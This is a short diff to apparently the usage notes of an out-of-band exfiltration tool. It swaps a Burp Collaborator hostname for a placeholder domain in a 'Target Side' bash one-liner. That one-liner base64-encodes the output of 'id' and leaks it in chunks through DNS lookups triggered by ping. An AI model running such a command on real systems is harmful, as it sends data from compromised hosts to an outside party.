@@ -10,7 +10,7 @@ WEBHOOK_URL = ''
 
 - Target Side: (keyword is __mysign__)
 ```bash
-id|base64|fold -10|while read x;do ping -c 1 $x.mysign.ywy0ex6g5mjt2jjvcnvpqrx20t6ku9.oastify.com ;done
+id|base64|fold -10|while read x;do ping -c 1 $x.mysign.mysite.com ;done
 
 ```
 
